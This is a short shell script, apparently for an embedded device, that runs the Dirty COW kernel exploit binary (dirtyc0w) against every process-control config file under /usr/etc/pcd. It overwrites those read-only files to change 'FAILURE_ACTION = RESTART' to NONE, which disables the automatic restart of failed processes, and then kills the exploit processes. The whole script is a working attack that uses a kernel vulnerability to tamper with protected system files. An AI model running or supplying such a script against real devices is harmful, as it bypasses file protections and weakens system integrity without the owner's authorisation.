#!/bin/sh
if [ ! -d /usr/etc/pcd ]; then
    echo "No pcd directory found on this device"
    exit 1
fi
pcds="$(ls /usr/etc/pcd | sed ':a;N;$!ba;s/\n/ /g')"
for p in $pcds; do
    grep "FAILURE_ACTION = RESTART" /usr/etc/pcd/$p > /dev/null
    action="$?"
    if [ "$action" -eq 0 ]; then
        dirtyc0w /usr/etc/pcd/$p "$(cat /usr/etc/pcd/$p | sed 's/RESTART/NONE/g')" &
    fi
done
dc_instances="$(ps | grep dirtyc0w | grep -oE "[0-9]{4,}" | sed ':a;N;$!ba;s/\n/ /g')"
for d in $dc_instances; do
    kill $d
done
